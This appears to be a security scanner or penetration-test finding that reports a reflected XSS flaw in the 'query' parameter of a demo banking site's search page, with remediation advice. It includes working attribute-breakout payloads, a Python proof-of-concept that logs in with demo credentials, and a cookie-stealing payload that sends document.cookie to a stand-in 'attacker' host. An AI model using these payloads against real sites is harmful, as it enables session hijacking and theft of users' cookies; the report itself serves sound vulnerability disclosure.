# Reflected XSS in GET /bank/queryxpath.jsp 'query' parameter

**ID:** vuln-0010
**Severity:** MEDIUM
**Found:** 2026-09-20 21:48:19 UTC
**Target:** http://demo.testfire.net
**Endpoint:** /bank/queryxpath.jsp
**Method:** GET
**CWE:** CWE-79
**CVSS:** 5.4
**Confidence:** High
**Fix Effort:** Low

## Description

The `query` parameter of `/bank/queryxpath.jsp` is reflected unencoded into the `value` attribute of an HTML input. A crafted payload breaks out of the attribute and injects markup/script, executing in the victim's authenticated session.

## Evidence

Request (authenticated with a valid `JSESSIONID`):
```http
GET /bank/queryxpath.jsp?content=queryxpath.jsp&query=%22%3E%3Cdetails%20open%20ontoggle%3Ddocument.title%3D9%3E HTTP/1.1
Host: demo.testfire.net
Cookie: JSESSIONID=<valid session>
```
Response excerpt (attribute breakout):
```html
<input type="text" id="query" name="query" width=450 value=""><details open ontoggle=document.title=9>"/>
```
Browser confirmation: after loading the crafted URL in an authenticated browser session the page title became `9`, proving script execution.

A `<script>` payload is also reflected unencoded:
```html
<input type="text" id="query" name="query" width=450 value=""><script>alert(1)</script>"/>
```

## Impact

An authenticated user (any logged-in banking user) who opens a crafted link has arbitrary JavaScript executed in their session within the app origin. The attacker can request the page to ride the victim's session — read account data, or (given the app's missing function-level authorization) invoke privileged operations — and exfiltrate non-HttpOnly cookies. Requires the victim to be logged in.

## Counterevidence

Considered whether the reflection is safely inside an attribute: it is, but the attribute is double-quoted and not encoded, so a `">` payload escapes it and the following markup is parsed as HTML (proven in a browser). Considered a server-side filter: none observed on this parameter — `<script>` and `<details ... ontoggle>` both reflect unchanged. No CSP header is returned. The only constraint is that the victim must hold an authenticated session, which affects severity (PR:L) but not exploitability.

## What Would Change This Severity

If the route were reachable only by a small privileged role, severity would drop; if it were reachable unauthenticated, severity would rise to match the public reflected XSS (6.1).

## Technical Analysis

`/bank/queryxpath.jsp` (authenticated, "Search News Articles") renders the `query` parameter directly into an input attribute:

```html
<input type="text" id="query" name="query" width=450 value=""><details open ontoggle=alert(1)>"/>
```

The value is not context-encoded. Because it is written into a quoted attribute, a payload beginning with `">` closes the attribute and the tag, and the remaining markup (`<details ...>`, `<script>`, `<img ...>`) is parsed as HTML. No CSP or X-XSS-Protection header is present and no server-side filter was observed on this parameter (unlike `/index.jsp`, `<script>` and `onerror` payloads pass through here unchanged).

## Proof of Concept

1. Log in as any valid user (e.g. `jsmith`).
2. Request `http://demo.testfire.net/bank/queryxpath.jsp?content=queryxpath.jsp&query="><details open ontoggle=document.title=9>` (URL-encode the payload).
3. The payload breaks out of the `value="` attribute and the `ontoggle` handler executes on parse, setting `document.title` to `9`.
4. A cookie-exfiltration payload such as `"><script>new Image().src='//attacker/'+document.cookie</script>` executes in the authenticated session.

```python
import requests, urllib.parse

s = requests.Session()
s.post("http://demo.testfire.net/doLogin",
       data={"uid": "jsmith", "passw": "demo1234", "btnSubmit": "Login"})

payload = '"><details open ontoggle=document.title=9>'
url = ("http://demo.testfire.net/bank/queryxpath.jsp?content=queryxpath.jsp&query="
       + urllib.parse.quote(payload, safe=''))
r = s.get(url)
i = r.text.find('id="query" name="query"')
print(r.text[i-30:i+140])
# In a browser the ontoggle handler executes (document.title becomes 9)
```

## Remediation

HTML-attribute-encode the `query` value (encode `&`, `<`, `>`, `"`, `'`) before placing it in the `value` attribute, and always wrap attributes in quotes. Prefer the templating engine's attribute escaping. Add a restrictive `Content-Security-Policy` to reduce impact of any residual injection.

## Assumptions

Requires a logged-in victim (any valid banking user). Delivery is via a crafted link opened while authenticated. The endpoint is reachable over HTTP/HTTPS.
